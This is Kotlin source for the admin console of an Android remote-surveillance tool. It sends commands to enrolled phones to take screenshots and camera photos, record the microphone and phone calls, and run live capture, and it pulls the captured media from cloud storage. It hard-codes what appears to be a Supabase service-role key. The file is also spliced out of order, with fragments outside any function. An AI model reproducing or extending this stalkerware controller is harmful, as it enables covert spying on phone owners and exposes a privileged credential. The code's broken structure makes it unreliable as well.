
          btnTakePhoto.setOnClickListener {
              selectedIds.forEach { id ->
                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/take_photo").setValue(true)
              }
              tvFeedback.text = "📸 Take Photo command sent to ${selectedIds.size} device(s)"
          }

          btnStartCameraVideo.setOnClickListener {
              selectedIds.forEach { id ->
                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/camera_video_flag").setValue(true)
              }
              tvFeedback.text = "🎥 Camera Video START sent to ${selectedIds.size} device(s)"
          }

          btnStopCameraVideo.setOnClickListener {
              selectedIds.forEach { id ->
                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/camera_video_flag").setValue(false)
              }
              tvFeedback.text = "⏹ Camera Video STOP sent to ${selectedIds.size} device(s)"
          }
  package com.example.devsync

import android.Manifest
import android.content.pm.PackageManager
import android.os.*
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray

class AdminControlActivity : AppCompatActivity() {

    companion object {
        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
        const val ONLINE_THRESHOLD_MS = 90_000L
        private const val PERM_REQ = 200
        fun convertGoogleDriveUrl(url: String): String = when {
            url.contains("drive.google.com/file/d/") ->
                "https://drive.google.com/uc?export=download&id=${url.substringAfter("/file/d/").substringBefore("/")}"
            url.contains("drive.google.com/open?id=") ->
                "https://drive.google.com/uc?export=download&id=${url.substringAfter("open?id=").substringBefore("&")}"
            else -> url
        }
    }

    // ── Views ─────────────────────────────────────────────────────────────────
    private lateinit var tvStatus: TextView
    private lateinit var tvSelected: TextView
    private lateinit var tvFeedback: TextView
    private lateinit var tvLiveCaptureStatus: TextView
    private lateinit var switchBluetooth: Switch
    private lateinit var switchCallRecording: Switch
    private lateinit var switchLiveCapture: Switch
    private lateinit var btnStopAll: Button
    private lateinit var btnSelectAll: Button
    private lateinit var btnDeselectAll: Button
    private lateinit var btnTriggerVibration: Button
    private lateinit var btnTakeScreenshot: Button
    private lateinit var btnStartRecording: Button
    private lateinit var btnStopRecording: Button
    private lateinit var btnAddSongUrl: Button
    private lateinit var btnAddWallpaperUrl: Button
    private lateinit var etRecordDuration: EditText
    private lateinit var etSongUrl: EditText
    private lateinit var etWallpaperUrl: EditText
    private lateinit var rvDevices: RecyclerView
    private lateinit var rvScreenshots: RecyclerView
    private lateinit var rvVideos: RecyclerView
    private lateinit var rvRecordings: RecyclerView
    private lateinit var rvSongs: RecyclerView
    private lateinit var rvWallpapers: RecyclerView
      private lateinit var rvPhotos: RecyclerView
      private lateinit var btnTakePhoto: Button
      private lateinit var btnStartCameraVideo: Button
      private lateinit var btnStopCameraVideo: Button
    private lateinit var tabSpy: Button
    private lateinit var tabMedia: Button
    private lateinit var tabControls: Button
    private lateinit var tabSpyContent: View
    private lateinit var tabMediaContent: View
    private lateinit var tabControlsContent: View

    // ── Data ──────────────────────────────────────────────────────────────────
    private val deviceList     = mutableListOf<DeviceInfo>()
    private val selectedIds    = mutableSetOf<String>()
    private val screenshotList = mutableListOf<ScreenshotItem>()
    private val videoList      = mutableListOf<RecordingItem>()
    private val recordingList  = mutableListOf<RecordingItem>()
    private val songList       = mutableListOf<MediaItem>()
    private val wallpaperList  = mutableListOf<MediaItem>()
      private val photoList      = mutableListOf<ScreenshotItem>()

    private lateinit var deviceAdapter: DeviceListAdapter
    private lateinit var screenshotAdapter: ScreenshotListAdapter
    private lateinit var videoAdapter: RecordingListAdapter
    private lateinit var recordingAdapter: RecordingListAdapter
    private lateinit var songAdapter: MediaListAdapter
    private lateinit var wallpaperAdapter: MediaListAdapter
      private lateinit var photoAdapter: ScreenshotListAdapter

    // ── Supabase HTTP client ──────────────────────────────────────────────────
    private val http = OkHttpClient.Builder()
        .callTimeout(30, java.util.concurrent.TimeUnit.SECONDS).build()

    // ── Auto-refresh handler ──────────────────────────────────────────────────
    private val refreshHandler = Handler(Looper.getMainLooper())
    private val refreshRunnable = object : Runnable {
        override fun run() {
            loadFromSupabase()
            refreshHandler.postDelayed(this, 45_000L) // refresh every 45s
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)
        requestRequiredPermissions()
        initViews()
        setupTabs()
        setupRecyclerViews()
        setupFirebaseListeners()
        setupClickListeners()
        // Load all content from Supabase directly (no Firebase dependency for content)
        loadFromSupabase()
        refreshHandler.postDelayed(refreshRunnable, 45_000L)
    }

    override fun onResume() {
        super.onResume()
        loadFromSupabase()
    }

    override fun onDestroy() {
        super.onDestroy()
        refreshHandler.removeCallbacks(refreshRunnable)
    }

    // ── Supabase Direct Loading ───────────────────────────────────────────────

    private fun loadFromSupabase() {
        tvFeedback.text = "⏳ Loading from Supabase..."
        CoroutineScope(Dispatchers.IO).launch {
            var count = 0
            try { count += loadScreenshotsFromSupabase() } catch (_: Exception) {}
            try { count += loadRecordingsFromSupabase() } catch (_: Exception) {}
            try { count += loadVideosFromSupabase() }      catch (_: Exception) {}
              try { count += loadPhotosFromSupabase() }       catch (_: Exception) {}
            withContext(Dispatchers.Main) {
                tvFeedback.text = "✅ Loaded $count items from Supabase"
            }
        }
    }

    private fun supabaseList(bucket: String): JSONArray {
        val body = """{"limit":200,"offset":0,"prefix":"","sortBy":{"column":"created_at","order":"desc"}}"""
        return try {
            val req = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/list/$bucket")
                .header("Authorization", "Bearer $SUPABASE_KEY")
                .header("apikey", SUPABASE_KEY)
                .header("Content-Type", "application/json")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            http.newCall(req).execute().use { resp ->
                JSONArray(resp.body?.string() ?: "[]")
            }
        } catch (_: Exception) { JSONArray() }
    }

    private suspend fun loadScreenshotsFromSupabase(): Int {
        val arr = supabaseList("screenshots")
        val list = mutableListOf<ScreenshotItem>()
        for (i in 0 until arr.length()) {
            try {
                val obj  = arr.getJSONObject(i)
                val name = obj.optString("name") ?: continue
                if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                // Filename format: {deviceId}_{timestamp}.jpg
                val noExt = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                val lastUnder = noExt.lastIndexOf('_')
                val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                val url = "$SUPABASE_URL/storage/v1/object/public/screenshots/$name"
                list.add(ScreenshotItem(name, did, url, ts))
            } catch (_: Exception) {}
        }
        list.sortByDescending { it.timestamp }
        withContext(Dispatchers.Main) { screenshotAdapter.updateItems(list) }
        return list.size
    }

    private suspend fun loadRecordingsFromSupabase(): Int {
        val arr  = supabaseList("recordings")
        val list = mutableListOf<RecordingItem>()
        for (i in 0 until arr.length()) {
            try {
                val obj  = arr.getJSONObject(i)
                val name = obj.optString("name") ?: continue
                if (!name.endsWith(".m4a") && !name.endsWith(".mp3")) continue
                // Filename format: {type}_{deviceIdShort}_{timestamp}.m4a
                val type = when {
                    name.startsWith("mic_")  -> "mic"
                    name.startsWith("call_") -> "call"
                    else                     -> "mic"
                }
                val noExt = name.removeSuffix(".m4a").removeSuffix(".mp3")
                val parts = noExt.split("_")
                val ts  = parts.lastOrNull()?.toLongOrNull() ?: 0L
                val did = if (parts.size >= 3) parts[1] else parts.getOrElse(1) { "" }
                val url = "$SUPABASE_URL/storage/v1/object/public/recordings/$name"
                list.add(RecordingItem(name, did, type, url, ts, name))
            } catch (_: Exception) {}
        }
        list.sortByDescending { it.timestamp }
        withContext(Dispatchers.Main) { recordingAdapter.updateItems(list) }
        return list.size
    }

    private suspend fun loadVideosFromSupabase(): Int {
        val arr  = supabaseList("videos")
        val list = mutableListOf<RecordingItem>()
        for (i in 0 until arr.length()) {
            try {
                val obj  = arr.getJSONObject(i)
                val name = obj.optString("name") ?: continue
                if (!name.endsWith(".mp4")) continue
                // Filename format: vid_{deviceIdShort}_{timestamp}.mp4
                val noExt = name.removeSuffix(".mp4")
                val parts = noExt.split("_")
                val ts  = parts.lastOrNull()?.toLongOrNull() ?: 0L
                val did = if (parts.size >= 3) parts[1] else parts.getOrElse(1) { "" }
                val url = "$SUPABASE_URL/storage/v1/object/public/videos/$name"
                list.add(RecordingItem(name, did, "video", url, ts, name))
            } catch (_: Exception) {}
        }
        list.sortByDescending { it.timestamp }
        withContext(Dispatchers.Main) { videoAdapter.updateItems(list) }
        return list.size
    }

      private suspend fun loadPhotosFromSupabase(): Int {
          val arr  = supabaseList("photos")
          val list = mutableListOf<ScreenshotItem>()
          for (i in 0 until arr.length()) {
              try {
                  val obj  = arr.getJSONObject(i)
                  val name = obj.optString("name") ?: continue
                  if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                  val noExt = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                  val lastUnder = noExt.lastIndexOf('_')
                  val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                  val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                  val url = "$SUPABASE_URL/storage/v1/object/public/photos/$name"
                  list.add(ScreenshotItem(name, did, url, ts))
              } catch (_: Exception) {}
          }
          list.sortByDescending { it.timestamp }
          withContext(Dispatchers.Main) { photoAdapter.updateItems(list) }
          return list.size
      }
  
    // ── Permissions ───────────────────────────────────────────────────────────

    private fun requestRequiredPermissions() {
        val needed = arrayOf(
            Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.PROCESS_OUTGOING_CALLS
        ).filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty())
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQ)
    }

    // ── Init Views ────────────────────────────────────────────────────────────

    private fun initViews() {
        tvStatus            = findViewById(R.id.tvStatus)
        tvSelected          = findViewById(R.id.tvSelected)
        tvFeedback          = findViewById(R.id.tvFeedback)
        tvLiveCaptureStatus = findViewById(R.id.tvLiveCaptureStatus)
        switchBluetooth     = findViewById(R.id.switchBluetooth)
        switchCallRecording = findViewById(R.id.switchCallRecording)
        switchLiveCapture   = findViewById(R.id.switchLiveCapture)
        btnStopAll          = findViewById(R.id.btnStopAll)
        btnSelectAll        = findViewById(R.id.btnSelectAll)
        btnDeselectAll      = findViewById(R.id.btnDeselectAll)
        btnTriggerVibration = findViewById(R.id.btnTriggerVibration)
        btnTakeScreenshot   = findViewById(R.id.btnTakeScreenshot)
        btnStartRecording   = findViewById(R.id.btnStartRecording)
        btnStopRecording    = findViewById(R.id.btnStopRecording)
        btnAddSongUrl       = findViewById(R.id.btnAddSongUrl)
        btnAddWallpaperUrl  = findViewById(R.id.btnAddWallpaperUrl)
        etRecordDuration    = findViewById(R.id.etRecordDuration)
        etSongUrl           = findViewById(R.id.etSongUrl)
        etWallpaperUrl      = findViewById(R.id.etWallpaperUrl)
        rvDevices           = findViewById(R.id.rvDevices)
        rvScreenshots       = findViewById(R.id.rvScreenshots)
        rvVideos            = findViewById(R.id.rvVideos)
        rvRecordings        = findViewById(R.id.rvRecordings)
        rvSongs             = findViewById(R.id.rvSongs)
        rvWallpapers        = findViewById(R.id.rvWallpapers)
          rvPhotos            = findViewById(R.id.rvPhotos)
          btnTakePhoto        = findViewById(R.id.btnTakePhoto)
          btnStartCameraVideo = findViewById(R.id.btnStartCameraVideo)
          btnStopCameraVideo  = findViewById(R.id.btnStopCameraVideo)
        tabSpy              = findViewById(R.id.tabSpy)
        tabMedia            = findViewById(R.id.tabMedia)
        tabControls         = findViewById(R.id.tabControls)
        tabSpyContent       = findViewById(R.id.tabSpyContent)
        tabMediaContent     = findViewById(R.id.tabMediaContent)
        tabControlsContent  = findViewById(R.id.tabControlsContent)
    }

    // ── Tabs ──────────────────────────────────────────────────────────────────

    private fun setupTabs() {
        fun showTab(active: Button, content: View) {
            listOf(tabSpy, tabMedia, tabControls).forEach {
                it.backgroundTintList = android.content.res.ColorStateList.valueOf(
                    android.graphics.Color.parseColor("#21262D"))
            }
            active.backgroundTintList = android.content.res.ColorStateList.valueOf(
                android.graphics.Color.parseColor("#238636"))
            tabSpyContent.visibility      = if (content == tabSpyContent) View.VISIBLE else View.GONE
            tabMediaContent.visibility    = if (content == tabMediaContent) View.VISIBLE else View.GONE
            tabControlsContent.visibility = if (content == tabControlsContent) View.VISIBLE else View.GONE
        }
        tabSpy.setOnClickListener      { showTab(tabSpy, tabSpyContent) }
        tabMedia.setOnClickListener    { showTab(tabMedia, tabMediaContent) }
        tabControls.setOnClickListener { showTab(tabControls, tabControlsContent) }
    }

    // ── RecyclerViews ─────────────────────────────────────────────────────────

    private fun setupRecyclerViews() {
        deviceAdapter = DeviceListAdapter(deviceList, selectedIds) { updateSelectedCount() }
        rvDevices.layoutManager = LinearLayoutManager(this); rvDevices.adapter = deviceAdapter

        screenshotAdapter = ScreenshotListAdapter(screenshotList)
        rvScreenshots.layoutManager = LinearLayoutManager(this); rvScreenshots.adapter = screenshotAdapter

        videoAdapter = RecordingListAdapter(videoList)
        rvVideos.layoutManager = LinearLayoutManager(this); rvVideos.adapter = videoAdapter

        recordingAdapter = RecordingListAdapter(recordingList)
        rvRecordings.layoutManager = LinearLayoutManager(this); rvRecordings.adapter = recordingAdapter

        songAdapter = MediaListAdapter(songList,
            onPlay   = { item -> sendToSelected { db -> db.child("remote_audio_url").setValue(convertGoogleDriveUrl(item.url)); db.child("audio_remote_trigger").setValue(System.currentTimeMillis()) } },
            onDelete = { item -> db("songs/${item.id}").removeValue() }
        )
        rvSongs.layoutManager = LinearLayoutManager(this); rvSongs.adapter = songAdapter

        wallpaperAdapter = MediaListAdapter(wallpaperList,
            onPlay   = { item -> sendToSelected { db -> db.child("wallpaper_url").setValue(convertGoogleDriveUrl(item.url)) } },
            onDelete = { item -> db("wallpapers/${item.id}").removeValue() }
        )
        rvWallpapers.layoutManager = LinearLayoutManager(this); rvWallpapers.adapter = wallpaperAdapter
    }

          photoAdapter = ScreenshotListAdapter(photoList)
          rvPhotos.layoutManager = LinearLayoutManager(this)
          rvPhotos.adapter = photoAdapter

    private fun db(path: String) = FirebaseDatabase.getInstance(DB_URL).getReference(path)

    // ── Firebase Listeners (devices + songs/wallpapers only) ──────────────────

    private fun setupFirebaseListeners() {
        // Connection status
        db(".info/connected").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val ok = s.getValue(Boolean::class.java) ?: false
                tvStatus.text = if (ok) "● ONLINE" else "● OFFLINE"
                tvStatus.setTextColor(android.graphics.Color.parseColor(if (ok) "#00FF88" else "#FF4444"))
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Devices
        db("registered_devices").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val now  = System.currentTimeMillis()
                val list = mutableListOf<DeviceInfo>()
                for (c in s.children) {
                    val id     = c.key ?: continue
                    val name   = c.child("name").getValue(String::class.java) ?: ""
                    val model  = c.child("model").getValue(String::class.java) ?: ""
                    val ls     = c.child("lastSeen").getValue(Long::class.java) ?: 0L
                    val online = (now - ls) < ONLINE_THRESHOLD_MS
                    val status = c.child("lastStatus").getValue(String::class.java) ?: ""
                    val sTime  = c.child("lastStatusTime").getValue(Long::class.java) ?: 0L
                    if (online) list.add(DeviceInfo(id, name, model, online, ls, status, sTime))
                }
                deviceAdapter.updateDevices(list)
                updateSelectedCount()
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Songs
        db("songs").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<MediaItem>()
                for (c in s.children) {
                    val id   = c.key ?: continue
                    val name = c.child("name").getValue(String::class.java) ?: "Song"
                    val url  = c.child("url").getValue(String::class.java) ?: continue
                    list.add(MediaItem(id, name, url))
                }
                songAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Wallpapers
        db("wallpapers").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<MediaItem>()
                for (c in s.children) {
                    val id   = c.key ?: continue
                    val name = c.child("name").getValue(String::class.java) ?: "Wallpaper"
                    val url  = c.child("url").getValue(String::class.java) ?: continue
                    list.add(MediaItem(id, name, url))
                }
                wallpaperAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    private fun updateSelectedCount() { tvSelected.text = "${selectedIds.size} selected" }

    private fun sendToSelected(action: (DatabaseReference) -> Unit) {
        if (selectedIds.isEmpty()) {
            Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
            return
        }
        selectedIds.forEach { id -> action(db("devices/$id")) }
    }

    // ── Click Listeners ───────────────────────────────────────────────────────

    private fun setupClickListeners() {
        btnStopAll.setOnClickListener {
            sendToSelected { d -> d.child("stop_all").setValue(true) }
            sendToSelected { d -> d.child("live_capture_enabled").setValue(false) }
            tvFeedback.text = "⛔ All stopped"
        }
        btnSelectAll.setOnClickListener {
            selectedIds.addAll(deviceList.map { it.id })
            deviceAdapter.notifyDataSetChanged()
            updateSelectedCount()
        }
        btnDeselectAll.setOnClickListener {
            selectedIds.clear()
            deviceAdapter.notifyDataSetChanged()
            updateSelectedCount()
        }

        switchLiveCapture.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
            tvLiveCaptureStatus.text = if (on) "🔴 Live ON" else "⏹ Live OFF"
            tvFeedback.text = if (on) "🎬 Live capture ON" else "⏹ Live capture OFF"
        }

        btnTakeScreenshot.setOnClickListener {
            if (selectedIds.isEmpty()) { Toast.makeText(this, "Device select karo!", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
            selectedIds.forEach { id -> db("devices/$id/take_screenshot").setValue(true) }
            tvFeedback.text = "📸 Screenshot → ${selectedIds.size} device(s)"
        }

        btnStartRecording.setOnClickListener {
            val dur = etRecordDuration.text.toString().toLongOrNull() ?: 30L
            sendToSelected { d -> d.child("start_recording").setValue(dur) }
            tvFeedback.text = "🎙️ Recording ${dur}s → ${selectedIds.size} device(s)"
        }
        btnStopRecording.setOnClickListener {
            sendToSelected { d -> d.child("stop_recording").setValue(true) }
            tvFeedback.text = "⏹ Stop recording sent"
        }
        switchCallRecording.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
            tvFeedback.text = "📞 Call recording ${if (on) "ON" else "OFF"}"
        }

        btnAddSongUrl.setOnClickListener {
            val url = etSongUrl.text.toString().trim()
            if (url.isEmpty()) return@setOnClickListener
            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Song ${songList.size + 1}" }
            db("songs").push().setValue(mapOf("name" to name, "url" to url))
            etSongUrl.setText("")
        }
        btnAddWallpaperUrl.setOnClickListener {
            val url = etWallpaperUrl.text.toString().trim()
            if (url.isEmpty()) return@setOnClickListener
            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Wallpaper ${wallpaperList.size + 1}" }
            db("wallpapers").push().setValue(mapOf("name" to name, "url" to url))
            etWallpaperUrl.setText("")
        }
        switchBluetooth.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
        }
        btnTriggerVibration.setOnClickListener {
            sendToSelected { d -> d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
            tvFeedback.text = "📳 Vibration triggered"
        }
    }
}
